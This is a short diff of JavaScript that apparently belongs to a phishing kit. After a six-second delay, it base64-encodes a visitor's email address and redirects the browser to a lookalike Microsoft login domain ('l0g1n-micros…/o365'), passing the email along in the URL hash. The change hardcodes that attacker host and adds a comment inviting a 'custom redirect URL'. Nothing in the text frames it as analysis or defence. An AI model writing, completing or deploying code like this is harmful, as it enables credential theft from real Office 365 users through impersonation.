@@ -95,7 +95,10 @@
 
                     setTimeout(() => {
                         const encodedEmail = btoa(email); // Encode email in base64
-                        const redirectTo = window.location.href.split('#')[0] + "https://l0g1n-micros.ftlivedocs.com/o365#" + encodedEmail;
+
+                        // Add your custom redirect URL here
+                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + encodedEmail;
+
                         console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo; // Redirect with base64 email in hash
                     }, 6000);
